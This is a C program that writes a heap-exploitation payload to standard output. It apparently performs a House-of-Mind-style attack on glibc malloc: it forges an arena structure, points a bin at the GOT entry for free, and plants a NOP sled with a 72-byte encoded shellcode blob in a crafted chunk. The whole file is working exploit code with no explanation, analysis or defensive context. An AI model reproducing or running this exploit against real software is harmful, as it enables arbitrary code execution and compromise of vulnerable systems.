#include <stdio.h>

#define BIN1 0xb7fd8430

char scode[] =
/* Size - 72 bytes. */
"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"
"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"
"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"
"\x5e\x9e\x39\xcb\xbf\x04\xea\x42";

char ret_str[4] = "\x00\x00\x00\x00";

void convert_endianess(int arg)
{
	int i=0;
	ret_str[3] = (arg & 0xFF000000) >> 24;
	ret_str[2] = (arg & 0x00FF0000) >> 16;
	ret_str[1] = (arg & 0x0000FF00) >> 8;
	ret_str[0] = (arg & 0x000000FF) >> 0;
}
int main() {
	int i=0,j=0;

        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* fd */
        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* bk */
        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* fd_nextsize */
        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* bk_nextsize */
	/* Fake Arena. */
        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* mutex */
        fwrite("\x01\x00\x00\x00", 4, 1, stdout); /* flag */
	for(i=0;i<10;i++)
        	fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fastbinsY */
        fwrite("\xb0\x0e\x10\x08", 4, 1, stdout); /* top */
        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* last_remainder */
	for(i=0;i<127;i++) {
		convert_endianess(BIN1+(i*8));
		if(i == 119) {
        		fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* preserve prev_size */
        		fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* preserve size */
		} else if(i==0) {
	        	fwrite("\xe8\x98\x04\x08", 4, 1, stdout); /* bins[i][0] = (GOT(free) - 12) */
	        	fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */
		} 
		else {
        		fwrite(ret_str, 4, 1, stdout); /* bins[i][0] */
	        	fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */
		}
	}
	for(i=0;i<4;i++) {
        	fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* binmap[i] */
	}	
        fwrite("\x00\x84\xfd\xb7", 4, 1, stdout); /* next */
        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* next_free */
        fwrite("\x00\x60\x0c\x00", 4, 1, stdout); /* system_mem */
        fwrite("\x00\x60\x0c\x00", 4, 1, stdout); /* max_system_mem */
	for(i=0;i<234;i++) {
        	fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* PAD */
	}
	for(i=0;i<722;i++) {
		if(i==721) {
			/* Chunk 724 contains the shellcode. */
        		fwrite("\xeb\x18\x00\x00", 4, 1, stdout); /* prev_size  - Jmp 24 bytes */
        		fwrite("\x0d\x04\x00\x00", 4, 1, stdout); /* size */
        		fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd */
        		fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk */
        		fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd_nextsize */
        		fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk_nextsize */
   			fwrite("\x90\x90\x90\x90\x90\x90\x90\x90" \
               		"\x90\x90\x90\x90\x90\x90\x90\x90", 16, 1, stdout);  /* NOPS */
   			fwrite(scode, sizeof(scode)-1, 1, stdout); /* SHELLCODE */
			for(j=0;j<230;j++)
        			fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
			continue;
		} else {
        		fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* prev_size */
        		fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* size */
		}
		if(i==720) {
			for(j=0;j<90;j++)
        			fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
        		fwrite("\x18\xa0\x04\x08", 4, 1, stdout); /* Arena Pointer */
			for(j=0;j<165;j++)
        			fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
		} else {
			for(j=0;j<256;j++)
        			fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
		}
	}
	return 0;	

}
